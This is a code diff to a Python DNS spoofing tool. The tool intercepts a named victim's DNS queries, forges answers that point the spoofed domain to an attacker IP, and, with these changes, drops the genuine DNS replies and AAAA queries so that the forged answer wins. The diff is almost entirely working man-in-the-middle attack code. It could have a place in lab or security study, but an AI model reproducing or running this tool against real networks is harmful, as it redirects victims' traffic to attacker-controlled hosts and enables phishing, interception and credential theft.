@@ -13,15 +13,25 @@ class DNSSpoofer:
         self.logger = logger
 
     def dns_spoofer(self, packet):
+        # Block real DNS replies going TO victim
+        if packet.haslayer(DNS) and packet.haslayer(UDP):
+            dns = packet[DNS]
+
+            # DNS response (qr = 1) destined for victim
+            if dns.qr == 1:
+                if packet.haslayer(IP) and packet[IP].dst == self.victim_ip:
+                    # Drop real DNS response
+                    return True
+
         # Only UDP DNS
         if not packet.haslayer(DNS) or not packet.haslayer(UDP):
-            return
+            return False
 
         dns = packet[DNS]
 
         # Only DNS queries
         if dns.qr != 0 or dns.qdcount == 0:
-            return
+            return False
 
         # IP version
         if packet.haslayer(IP):
@@ -33,10 +43,10 @@ class DNSSpoofer:
             src = packet[IPv6].src
             dst = packet[IPv6].dst
         else:
-            return
+            return False
 
         if src != self.victim_ip:
-            return
+            return False
 
         qname = dns.qd.qname
         qtype = dns.qd.qtype
@@ -44,17 +54,16 @@ class DNSSpoofer:
         domain = qname.decode(errors="ignore").rstrip(".").lower()
 
         if domain != self.domain_to_spoof.lower():
-            return
+            return False
 
         # A or AAAA only
         if qtype == 1:          # A
             rdata = self.attacker_ip
             rrtype = "A"
-        elif qtype == 28:       # AAAA
-            rdata = self.attacker_ipv6
-            rrtype = "AAAA"
+        elif qtype == 28:  # AAAA
+            return True   # DROP it, do not forward, do not reply
         else:
-            return
+            return True # Drop this as well
 
         reply = (
             ip_cls(src=dst, dst=src) /
@@ -64,6 +73,7 @@ class DNSSpoofer:
                 qr=1,
                 aa=1,
                 ra=1,
+                rcode=0,
                 qd=dns.qd,
                 an=DNSRR(
                     rrname=qname,
@@ -76,3 +86,4 @@ class DNSSpoofer:
 
         send(reply, iface=self.interface, verbose=0)
         self.logger(f"[DNS] Spoofed {qname.decode().rstrip('.')} → {rdata}")
+        return True
